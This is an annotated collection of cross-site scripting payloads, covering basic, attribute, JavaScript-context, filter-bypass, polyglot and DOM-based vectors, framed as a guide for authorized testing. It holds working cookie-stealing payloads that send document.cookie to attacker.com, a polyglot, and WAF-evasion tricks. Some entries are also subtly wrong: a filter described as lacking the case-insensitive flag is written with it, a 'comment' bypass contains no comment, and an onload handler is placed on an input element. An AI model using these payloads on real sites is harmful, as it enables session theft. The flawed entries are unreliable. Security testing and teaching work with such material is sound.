# XSS Payloads Collection

This document contains annotated XSS payloads explaining why each works and in which contexts they are effective.

---

## Basic XSS Payloads

### 1. Simple Alert Box
```html
<script>alert('XSS')</script>
```
**Why it works**:
- Most basic XSS payload
- Browser interprets `<script>` tags as executable JavaScript
- `alert()` function displays a popup
- Used for proof-of-concept (PoC) testing

**Context**: Works when input is reflected in HTML body without encoding

**Bypass level**: None - works only if no filtering exists

---

### 2. Alert with Document Domain
```html
<script>alert(document.domain)</script>
```
**Why it works**:
- Proves script execution in the context of the vulnerable domain
- `document.domain` returns the current domain name
- More convincing PoC than simple alert

**Context**: Same as #1, but better for reporting

**Use case**: Bug bounty reporting - proves execution on target domain

---

### 3. IMG Tag with Onerror
```html
<img src=x onerror=alert('XSS')>
```
**Why it works**:
- Uses HTML event handler instead of `<script>` tag
- Browser tries to load image from invalid source 'x'
- When image fails to load, `onerror` event triggers
- Executes JavaScript in the event handler

**Context**: Bypasses filters that only block `<script>` tags

**Bypass level**: Moderate - works against basic script tag filtering

---

### 4. IMG Tag Without Quotes
```html
<img src=x onerror=alert(1)>
```
**Why it works**:
- No quotes around attribute values
- Bypasses filters that look for quoted attributes
- HTML5 allows unquoted attributes

**Context**: Bypasses regex filters requiring quotes

**Bypass technique**: Quote removal

---

## Attribute Context Payloads

### 5. Breaking Out of Attribute
```html
" onload="alert('XSS')
```
**Why it works**:
- Used when input is inside an HTML attribute
- First `"` closes the current attribute
- `onload="alert('XSS')"` creates new attribute with JavaScript
- Example vulnerable code: `<input value="USER_INPUT">`
- Result: `<input value="" onload="alert('XSS')"">`

**Context**: Input reflected inside HTML attribute value

**Attack scenario**: Search forms, input fields with reflected values

---

### 6. Breaking Out with Event Handler
```html
' autofocus onfocus='alert(1)
```
**Why it works**:
- Single quote `'` closes the attribute
- `autofocus` automatically focuses the element on page load
- `onfocus` event fires when element receives focus
- Works in single-quoted attributes: `<input value='USER_INPUT'>`

**Context**: Single-quoted attribute context

**Bypass level**: Moderate - bypasses double-quote filters

---

## JavaScript Context Payloads

### 7. Breaking Out of JavaScript String
```javascript
'; alert('XSS'); //
```
**Why it works**:
- Used when input is inside a JavaScript string
- `';` closes the current JavaScript statement
- `alert('XSS');` executes the payload
- `//` comments out remaining code to prevent syntax errors
- Example vulnerable code: `var search = 'USER_INPUT';`
- Result: `var search = ''; alert('XSS'); //';`

**Context**: Input reflected inside JavaScript code

**Use case**: Inline scripts with user data

---

### 8. JavaScript Template Literal
```javascript
${alert(document.domain)}
```
**Why it works**:
- Used when input is inside JavaScript template literals (backticks)
- Template literals allow embedded expressions with `${}`
- JavaScript evaluates the expression
- Example vulnerable code: `` var msg = `Hello USER_INPUT`; ``
- Result: `` var msg = `Hello ${alert(document.domain)}`; ``

**Context**: ES6 template literal strings

**Bypass level**: Advanced - specific to modern JavaScript

---

## Filter Bypass Payloads

### 9. Mixed Case Bypass
```html
<ScRiPt>alert('XSS')</sCrIpT>
```
**Why it works**:
- HTML is case-insensitive
- Bypasses case-sensitive filters that only block lowercase `<script>`
- Browser still interprets it as a script tag

**Context**: Bypasses simple regex filters

**Filter bypassed**: `/script/i` without case-insensitive flag

---

### 10. URL Encoding Bypass
```html
%3Cscript%3Ealert('XSS')%3C/script%3E
```
**Why it works**:
- URL encoding translates characters to %XX format
- `%3C` = `<`, `%3E` = `>`
- Browser or server decodes URL-encoded characters
- May bypass WAFs that don't decode before filtering

**Context**: URL parameters, GET requests

**Bypass level**: Basic - works against weak input validation

---

### 11. Double Encoding
```html
%253Cscript%253Ealert('XSS')%253C/script%253E
```
**Why it works**:
- Encodes the `%` character itself as `%25`
- `%253C` = `%3C` after first decode = `<` after second decode
- Bypasses filters that decode once but application decodes twice

**Context**: Double URL decoding scenarios

**Bypass technique**: Encoding evasion

---

### 12. HTML Entity Encoding
```html
&lt;script&gt;alert('XSS')&lt;/script&gt;
```
**Why it works**:
- `&lt;` = `<`, `&gt;` = `>`
- Works if input is decoded after filtering
- Or if input is placed in a context where entities are decoded

**Context**: Specific to server-side decoding order

**Note**: Usually NOT effective as browsers don't execute entity-encoded scripts

---

## Advanced Payloads

### 13. SVG with Script
```html
<svg onload=alert('XSS')>
```
**Why it works**:
- SVG elements support event handlers like `onload`
- Browser executes JavaScript when SVG loads
- Bypasses filters that only look for `<script>` or common HTML tags

**Context**: SVG-aware contexts, file uploads

**Bypass level**: Advanced - bypasses tag-specific filters

---

### 14. Body Tag with Onload
```html
<body onload=alert('XSS')>
```
**Why it works**:
- `<body>` tag is valid HTML
- `onload` event fires when body content loads
- May bypass filters focused on `<script>` tags

**Context**: When attacker can inject full tags

**Limitation**: Requires ability to inject body tag (rare)

---

### 15. Iframe with JavaScript Protocol
```html
<iframe src="javascript:alert('XSS')"></iframe>
```
**Why it works**:
- `javascript:` protocol executes JavaScript
- iframe loads the JavaScript URL
- Executes code in the frame context

**Context**: When iframe injection is possible

**Bypass level**: Moderate - bypasses script tag filters

---

### 16. Link with JavaScript Protocol
```html
<a href="javascript:alert('XSS')">Click</a>
```
**Why it works**:
- `javascript:` protocol in href attribute
- Executes when user clicks the link
- Requires user interaction

**Context**: Link injection points

**User interaction**: Required (click)

---

### 17. Form with Action JavaScript
```html
<form action="javascript:alert('XSS')"><input type="submit"></form>
```
**Why it works**:
- Form action can use `javascript:` protocol
- Executes when form is submitted
- User must click submit button

**Context**: Form injection

**User interaction**: Required (submit)

---

## Polyglot Payloads

### 18. Polyglot XSS
```html
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```
**Why it works**:
- Works in multiple contexts (HTML, attribute, JavaScript)
- Closes various tags that might contain the injection point
- Multiple vectors in one payload
- Increases chance of execution in unknown context

**Context**: Multiple/unknown contexts

**Use case**: Automated scanning, blind XSS

---

## Cookie Stealing Payloads

### 19. Basic Cookie Stealer
```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```
**Why it works**:
- `document.cookie` reads all cookies
- `document.location` redirects to attacker's server
- Cookie is sent as URL parameter
- Attacker logs the cookie from server logs

**Context**: Full XSS exploitation

**Impact**: Session hijacking

**Note**: Only works if cookies don't have HttpOnly flag

---

### 20. Image-Based Cookie Stealer
```html
<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
```
**Why it works**:
- Creates invisible image request
- Sends cookie without redirecting user
- Stealthier than location redirect
- User remains on original page

**Context**: Stealthy cookie theft

**Advantage**: No visible redirect

---

### 21. Fetch API Cookie Stealer
```html
<script>fetch('http://attacker.com/steal',{method:'POST',body:document.cookie})</script>
```
**Why it works**:
- Modern JavaScript Fetch API
- Sends cookie via POST request
- More flexible than image/location methods

**Context**: Modern browsers with Fetch API

**Bypass level**: May bypass CORS in specific scenarios

---

## DOM-Based XSS Payloads

### 22. Hash Fragment Injection
```javascript
#<script>alert('XSS')</script>
```
**Why it works**:
- Used when JavaScript reads `location.hash`
- Fragment identifier (#) doesn't get sent to server
- Client-side code processes it
- Example vulnerable code: `document.write(location.hash)`

**Context**: DOM-based XSS with hash

**Server-side**: Not visible in server logs

---

### 23. Eval Injection
```javascript
alert('XSS')
```
**Why it works**:
- When user input is passed to `eval()` function
- `eval()` executes strings as JavaScript code
- Example vulnerable code: `eval(userInput)`

**Context**: Direct eval() of user input

**Impact**: Arbitrary JavaScript execution

---

## WAF Bypass Payloads

### 24. Using HTML Comments
```html
<script>alert('XSS')</script>
```
**Why it works**:
- Some parsers strip HTML comments
- May bypass regex-based WAFs

**Context**: Specific WAF configurations

**Bypass level**: WAF-specific

---

### 25. Null Byte Injection
```html
<script>alert('XSS')</script>%00
```
**Why it works**:
- Null byte (`%00`) may terminate string in some languages
- WAF might stop processing at null byte
- Browser ignores null byte and executes script

**Context**: Specific language/WAF combinations

**Bypass technique**: String termination

---

## Testing Methodology

### Recommended Testing Order:

1. **Basic payloads** (#1-4) - Test for any XSS
2. **Context-specific** (#5-8) - Identify injection context
3. **Filter bypass** (#9-12) - Test against filters
4. **Advanced vectors** (#13-18) - Try alternative tags/methods
5. **Exploitation** (#19-21) - Prove real-world impact

---

## Important Notes

- **Always test in authorized environments only**
- **Start with PoC payloads** (alert) before exploitation
- **Document the exact payload** that worked
- **Test for HttpOnly flag** before cookie stealing
- **Consider CSP headers** when selecting payloads
- **Encode payloads appropriately** for the context

---

## References

- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

**Reminder**: These payloads are for authorized security testing only. Unauthorized use is illegal and unethical.
